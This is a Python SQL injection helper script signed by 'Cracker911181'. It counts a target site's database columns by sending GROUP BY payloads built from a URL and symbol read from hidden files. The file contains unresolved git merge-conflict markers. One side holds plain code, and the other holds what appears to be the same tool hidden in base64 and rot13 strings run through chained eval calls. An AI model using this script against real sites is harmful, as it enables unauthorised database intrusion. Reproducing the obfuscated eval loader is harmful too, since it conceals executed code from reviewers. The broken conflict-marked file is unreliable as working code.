# Coded by Cracker
# CRACKER911181
 

<<<<<<< HEAD

import requests,sys



#Text colour
#created By Cracker911181
colouroff="\x1b[00m" #colour off

red="\x1b[91m" #red
green="\x1b[92m" #green
yellow="\x1b[93m" #yellow
blue="\x1b[94m" #blue
rosy="\x1b[95m" #rosy
pest="\x1b[96m" #pest



link_file=open(".link.txt","r")
link=link_file.read()

smbl=open(".smbl.txt","r")
symbol=smbl.read()

smbl1=symbol[0]
smbl2=symbol[1:]

######

print(blue+"\n\n[+]Counting Column\n"+yellow)

#######

colmn=1
for count in range(10):
	
	real_colomn=str(colmn-1)
	colomn=str(colmn)
	print("[=] Now Counting Column : "+real_colomn)
	if smbl1=="'":
		url=str(link+smbl1+"+GROUP+BY+"+colomn+smbl2)
		
		resp=requests.get(url,headers={"User-Agent": "XY"}).text
		
		if "Unknown"  in resp or "Undefined" in resp or "error" in resp or "Error" in resp:
			real_url=str(link+smbl1+"+GROUP+BY+"+real_colomn+smbl2)
			colomn_opn=open(".colomn.txt","w")
			colomn_opn.write(real_colomn)
			colomn_opn.close()
			print(real_url)
			sys.exit()
	
	else:
		url=str(link+"+GROUP+BY+"+colomn+symbol)
		
		resp=requests.get(url,headers={"User-Agent": "XY"}).text
		
		if "Unknown"  in resp or "Undefined" in resp or "error" in resp or "Error" in resp:
			real_url=str(link+"+GROUP+BY+"+real_colomn+symbol)
			colomn_opn=open(".colomn.txt","w")
			colomn_opn.write(real_colomn)
			colomn_opn.close()
			print(real_url)
			sys.exit()
	colmn=colmn+1
	
=======
import base64, codecs
magic = 'CmltcG9ydCByZXF1ZXN0cyxzeXMKCgoKI1RleHQgY29sb3VyCiNjcmVhdGVkIEJ5IENyYWNrZXI5MTExODEKY29sb3Vyb2ZmPSJceDFiWzAwbSIgI2NvbG91ciBvZmYKCnJlZD0iXHgxYls5MW0iICNyZWQKZ3JlZW49Ilx4MWJbOTJtIiAjZ3JlZW4KeWVsbG93PSJceDFiWzkzbSIgI3llbGxvdwpibHVlPSJceDFiWzk0bSIgI2JsdWUKcm9zeT0iXHgxYls5NW0iICNyb3N5CnBlc3Q9Ilx4MWJbOTZtIiAjcGVzdAoKCgpsaW5rX2ZpbGU9b3BlbigiLmxpbmsudHh0IiwiciIpCmxpbms9bGlua19maWxlLnJlYWQoKQoKc21ibD1vcGVuKCIuc21ibC50eHQiLCJyIikKc3ltYm9sPXNtYmwucmVhZCgpCgpzbWJ'
love = 'fZG1mrJ1vo2koZS0Xp21voQV9p3ygLz9fJmR6KDbXVlZwVlZwPtcjpzyhqPuvoUIyXlWpoykhJlgqD291oaEcozptD29fqJ1hKT4vX3yyoTkiqlxXPvZwVlZwVlZXPzAioT1hCGRXMz9lVTAiqJ50VTyhVUWuozqyXQRjXGbXPDbWpzIuoS9wo2kioJ49p3ElXTAioT1hYGRcPtywo2kioJ49p3ElXTAioT1hXDbWpUWcoaDbVyf9KFOBo3ptD291oaEcozptD29fqJ1hVQbtVvglMJSfK2AioT9govxXPJyzVUAgLzjkCG0vWlV6PtxWqKWfCKA0pvufnJ5eX3AgLzjkXlVeE1WCIINeDyxeVvgwo2kioJ4ep21voQVcPtxWPtxWpzImpQ1lMKS1MKA0pl5aMKDbqKWfYTuyLJEypaZ9rlWIp2IlYHSaMJ50VwbtVyuMVa'
god = '0pLnRleHQKCQkKCQlpZiAiVW5rbm93biIgIGluIHJlc3Agb3IgIlVuZGVmaW5lZCIgaW4gcmVzcCBvciAiZXJyb3IiIGluIHJlc3Agb3IgIkVycm9yIiBpbiByZXNwOgoJCQlyZWFsX3VybD1zdHIobGluaytzbWJsMSsiK0dST1VQK0JZKyIrcmVhbF9jb2xvbW4rc21ibDIpCgkJCWNvbG9tbl9vcG49b3BlbigiLmNvbG9tbi50eHQiLCJ3IikKCQkJY29sb21uX29wbi53cml0ZShyZWFsX2NvbG9tbikKCQkJY29sb21uX29wbi5jbG9zZSgpCgkJCXByaW50KHJlYWxfdXJsKQoJCQlzeXMuZXhpdCgpCgkKCWVsc2U6CgkJdXJsPXN0cihsaW5rKyIrR1JPVVArQlkrIitjb2xvbW4rc3ltYm9sKQoJCQoJCXJlc'
destiny = '3N9pzIkqJImqUZhM2I0XUIloPkbMJSxMKWmCKfvIKAypv1OM2IhqPV6VPWLJFW9XF50MKu0PtxWPtxWnJLtVyIhn25iq24vVPOcovOlMKAjVT9lVPWIozEyMzyhMJDvVTyhVUWyp3Nto3VtVzIlpz9lVvOcovOlMKAjVT9lVPWSpaWipvVtnJ4tpzImpQbXPDxWpzIuoS91pzj9p3ElXTkcozfeVvgUHx9IHPgPJFfvX3WyLJksL29fo21hX3A5oJWioPxXPDxWL29fo21hK29jow1ipTIhXPVhL29fo21hYaE4qPVfVapvXDbWPDywo2kioJ5so3OhYaqlnKEyXUWyLJksL29fo21hXDbWPDywo2kioJ5so3OhYzAfo3AyXPxXPDxWpUWcoaDbpzIuoS91pzjcPtxWPKA5pl5yrTy0XPxXPJAioT1hCJAioT1hXmRXPD=='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
>>>>>>> 92deafb008d1bb650e2a2df0d133f097b979d969
